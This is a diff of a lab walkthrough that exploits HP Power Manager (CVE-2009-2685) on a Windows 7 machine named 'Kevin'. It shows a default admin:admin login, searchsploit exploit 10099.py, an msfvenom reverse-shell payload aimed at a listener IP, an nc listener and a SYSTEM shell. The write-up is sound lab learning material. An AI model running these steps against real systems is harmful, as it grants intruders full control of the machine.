@@ -1,6 +1,8 @@
 # Kevin - Windows 7 Exploitation Walkthrough
 
-This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The goal was to achieve SYSTEM-level access through web-based exploitation using a known vulnerability in HP Power Manager and capture the final flag.
+This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The objective was to gain full SYSTEM-level access by exploiting a vulnerable web application and capturing the administrator flag.
+
+---
 
 ## Target Information
 
@@ -8,7 +10,9 @@ This is a full exploitation walkthrough for the **Kevin** lab machine running Wi
 **Operating System:** Windows 7 Ultimate N  
 **Hostname:** KEVIN  
 **Workgroup:** WORKGROUP  
-**Vulnerable Service:** HP Power Manager (GoAhead WebServer) on Port 80  
+**Exposed Application:** HP Power Manager (GoAhead WebServer)
+
+---
 
 ## Enumeration
 
@@ -16,9 +20,9 @@ Performed an initial Nmap scan:
 
 ```bash
 nmap -T4 -A 192.168.232.45 -oN nmap
-Identified open ports:
+Identified ports:
 
-80 (HTTP - GoAhead WebServer)
+80 (HTTP - HP Power Manager)
 
 135 (RPC)
 
@@ -28,26 +32,28 @@ Identified open ports:
 
 49152–49159 (MSRPC dynamic ports)
 
-Discovered login panel for HP Power Manager at http://192.168.232.45.
+Navigated to: http://192.168.232.45
+Observed HP Power Manager login page.
 
-Used default credentials:
+Default credentials used:
 
 pgsql
 Copy
 Edit
-admin : admin
+Username: admin
+Password: admin
 Exploitation - HP Power Manager RCE
-Searched for a known exploit:
+Searched for known exploits using Searchsploit:
 
 bash
 Copy
 Edit
 searchsploit HP Power Manager
 searchsploit -m 10099.py
-Vulnerability: CVE-2009-2685 (Remote Command Execution)
+Confirmed vulnerability: CVE-2009-2685 — Remote Code Execution.
 
 Reverse Shell Payload
-Generated a custom reverse shell with msfvenom:
+Generated a custom reverse shell using msfvenom:
 
 bash
 Copy
@@ -55,35 +61,35 @@ Edit
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=80 \
 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
 -e x86/alpha_mixed -f c
-Injected the payload into the 10099.py exploit.
+Payload was inserted into the SHELL variable in 10099.py.
 
-Gaining Access
-Started a listener on the attack machine:
+Exploit Execution & Shell Access
+Started listener:
 
 bash
 Copy
 Edit
 rlwrap nc -nlvp 80
-Executed the exploit:
+Executed exploit:
 
 bash
 Copy
 Edit
 python2.7 10099.py 192.168.232.45
-Gained a reverse shell as:
+Gained shell access as:
 
 sql
 Copy
 Edit
 NT AUTHORITY\SYSTEM
-Flag
-Navigated to:
+Captured Flag
+Located in:
 
 makefile
 Copy
 Edit
 C:\Users\Administrator\Desktop\proof.txt
-Captured the flag:
+Flag:
 
 nginx
 Copy
@@ -96,22 +102,21 @@ searchsploit
 
 msfvenom
 
+python2.7
+
 netcat (nc)
 
 rlwrap
 
-python2.7
-
 Summary
-Performed enumeration with Nmap to discover services
+Performed recon and discovered exposed web service
 
-Identified vulnerable web interface using default credentials
+Identified and exploited RCE vulnerability (CVE-2009-2685)
 
-Leveraged a known exploit (CVE-2009-2685) for RCE
+Gained SYSTEM-level access via reverse shell
 
-Used a custom reverse shell to get SYSTEM access
-
-Captured the administrator flag
+Retrieved administrator flag
 
 Author
 Farhanahmad Quraishi
+
